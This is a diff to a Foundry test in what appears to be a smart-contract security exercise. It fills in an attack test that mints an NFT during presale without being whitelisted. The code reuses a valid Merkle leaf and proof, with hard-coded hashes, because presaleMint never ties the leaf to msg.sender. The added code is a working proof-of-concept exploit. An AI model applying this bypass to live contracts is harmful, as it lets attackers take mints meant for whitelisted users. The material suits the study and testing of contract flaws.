@@ -27,12 +27,24 @@ contract CounterTest is Test {
 
     function test_Attack() public {
         vm.startPrank(attackerAddress);
-        //Carry out the attack here
-        // The attacker tries to mint during the presale without being whitelisted
         
-
+        // VULNERABILITY: The contract doesn't verify that the leaf corresponds to msg.sender
+        // An attacker can use any valid leaf from the whitelist to mint
         
+        // Use a valid proof and leaf from the whitelist
+        bytes32[] memory proof = new bytes32[](2);
+        proof[0] = 0x723077b8a1b173adc35e5f0e7e3662fd1208212cb629f9c128551ea7168da722;
+        proof[1] = 0x3d0b73d59ce6f496e7f4dd84f9d35021be8d570990e1b7cc61b2dd5e55bfb475;
+        
+        bytes32 validLeaf = 0xb4260ebeada881f749f68942b3f0e36ae8ba2751d11fbbad46a58feb7b4cda51;
+        
+        // Successfully mint using presaleMint() without being on the whitelist
+        furry.presaleMint(proof, validLeaf);
+        
+        // Verify the attack was successful
         assertEq(furry.ownerOf(0), attackerAddress);
+        console.log("Attack successful! Attacker now owns NFT #0 using presaleMint()");
+        
         vm.stopPrank();
     }
 }
